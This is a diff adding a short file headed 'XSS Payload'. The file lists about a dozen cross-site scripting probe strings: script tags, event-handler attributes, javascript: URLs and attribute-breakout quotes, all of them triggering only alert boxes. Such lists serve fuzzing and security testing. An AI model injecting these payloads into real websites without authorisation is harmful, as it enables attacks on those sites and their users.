@@ -1,0 +1,13 @@
+# XSS Payload
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<a href="javascript:alert(1)">click</a>
+<iframe src="javascript:alert(1)">
+"onfocus=alert(1) autofocus="
+'onfocus=alert(1) autofocus='
+"onmouseover=alert(1)//
+'onmouseover=alert(1)//
